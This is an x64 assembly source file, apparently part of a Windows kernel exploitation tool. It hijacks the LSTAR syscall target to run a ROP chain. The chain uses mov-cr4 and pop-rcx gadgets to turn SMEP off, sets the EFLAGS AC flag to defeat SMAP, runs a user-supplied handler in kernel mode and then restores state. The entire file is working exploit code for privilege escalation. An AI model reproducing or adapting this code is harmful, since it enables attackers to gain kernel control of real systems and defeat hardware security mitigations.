extern msrexec_handler : proc

.data
	; offsets into _KPCR/_KPRCB
	m_kpcr_rsp_offset  dq	0h		
	m_kpcr_krsp_offset dq	0h
	m_system_call	   dq	0h

	m_mov_cr4_gadget dq 0h
	m_sysret_gadget  dq 0h
	m_pop_rcx_gadget dq 0h

	m_smep_on  dq	0h
	m_smep_off dq	0h

	public m_smep_on
	public m_smep_off

	public m_kpcr_rsp_offset
	public m_kpcr_krsp_offset

	public m_pop_rcx_gadget
	public m_mov_cr4_gadget
	public m_sysret_gadget
	public m_system_call

.code
syscall_handler proc
	swapgs														; swap gs to kernel gs (_KPCR...)

	mov rax, m_kpcr_rsp_offset									; save usermode stack to _KPRCB
	mov gs:[rax], rsp

	mov rax, m_kpcr_krsp_offset									; load kernel rsp....
	mov rsp, gs:[rax]

	push rcx													; push RIP
	push r11													; push EFLAGS

	mov rcx, r10												; swapped by syscall instruction so we switch it back...
	sub rsp, 020h
	call msrexec_handler										; call c++ handler (which restores LSTAR and calls lambda...)
	add rsp, 020h

	pop r11														; pop EFLAGS
	pop rcx														; pop RIP

	mov rax, m_kpcr_rsp_offset									; restore rsp back to usermode stack...
	mov rsp, gs:[rax]											

	swapgs														; swap back to TIB...
	ret
syscall_handler endp

syscall_wrapper proc
	push r10													; syscall puts RIP into rcx...
	pushfq

	mov r10, rcx												; swap r10 and rcx...
	push m_sysret_gadget										; REX.W prefixed...

	lea rax, finish												; preserved value of RIP by putting it on the stack here...
	push rax													;

	push m_pop_rcx_gadget										; gadget to put RIP back into rcx...
	push m_mov_cr4_gadget										; turn smep back on...

	push m_smep_on												; value of CR4 with smep off...
	push m_pop_rcx_gadget										;

	lea rax, syscall_handler									; rop to syscall_handler to handle the syscall...
	push rax													;

	push m_mov_cr4_gadget										; disable smep...
	push m_smep_off												; 

	pushfq														; THANK YOU DREW YOU SAVED THE PROJECT!!!
	pop rax														; this will set the AC flag in EFLAGS which "disables SMAP"...
	or rax, 040000h												;
	push rax													;
	popfq														;

	syscall														; LSTAR points at a pop rcx gadget... 
																; it will put m_smep_off into rcx...
finish:
	popfq														; restore EFLAGS...
	pop r10														; restore r10...
	ret
syscall_wrapper endp
end